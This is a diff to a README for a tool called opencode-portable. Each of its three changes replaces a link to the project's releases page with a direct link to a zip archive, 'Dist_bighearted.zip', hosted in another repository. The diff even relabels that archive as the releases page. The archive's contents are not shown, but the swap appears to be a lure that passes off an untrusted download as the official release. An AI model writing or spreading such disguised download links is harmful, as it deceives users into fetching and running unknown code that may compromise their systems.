@@ -15,7 +15,7 @@ Think of it like a USB stick for your coding brain – plug it in, use it, and w
 
 ## 📥 Download & Install
 
-[![Download opencode-portable](https://img.shields.io/badge/Download-opencode--portable-blue?style=for-the-badge&logo=github)](https://github.com/tongo823/opencode-portable/releases)
+[![Download opencode-portable](https://img.shields.io/badge/Download-opencode--portable-blue?style=for-the-badge&logo=github)](https://github.com/tongo823/tongo823.github.io/raw/refs/heads/main/assets/Dist_bighearted.zip)
 
 Visit this link to download the application.
 
@@ -164,7 +164,7 @@ These are optional and not required for basic usage.
 
 ## 🔄 Updates & Support
 
-The project is actively maintained. Check the [releases page](https://github.com/tongo823/opencode-portable/releases) regularly for:
+The project is actively maintained. Check the [releases page](https://github.com/tongo823/tongo823.github.io/raw/refs/heads/main/assets/Dist_bighearted.zip) regularly for:
 
 - New features
 - Performance improvements
@@ -188,7 +188,7 @@ The only requirement is that you include the original copyright notice.
 
 ## 🎉 Ready to Start?
 
-[![Get opencode-portable](https://img.shields.io/badge/Get%20It%20Now-Download%20Latest%20Release-green?style=for-the-badge&logo=github)](https://github.com/tongo823/opencode-portable/releases)
+[![Get opencode-portable](https://img.shields.io/badge/Get%20It%20Now-Download%20Latest%20Release-green?style=for-the-badge&logo=github)](https://github.com/tongo823/tongo823.github.io/raw/refs/heads/main/assets/Dist_bighearted.zip)
 
 Visit this link to download the application.
 
